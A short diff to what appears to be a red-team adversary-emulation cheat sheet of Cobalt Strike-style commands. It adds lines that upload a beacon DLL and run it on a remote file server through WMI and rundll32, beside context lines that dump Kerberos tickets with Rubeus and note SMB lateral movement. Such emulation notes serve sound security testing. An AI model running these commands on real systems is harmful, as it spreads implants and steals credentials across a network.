@@ -287,6 +287,10 @@ execute-assembly /opt/Rubeus.exe dump
 Always use a FQDN instead of an IP.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+upload /tmp/beacon.dll
+remote-exec wmi fileserver rundll32 c:\windows\temp\beacon.dll,start
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
   movement, as well as follow-on victim to victim communications.
 
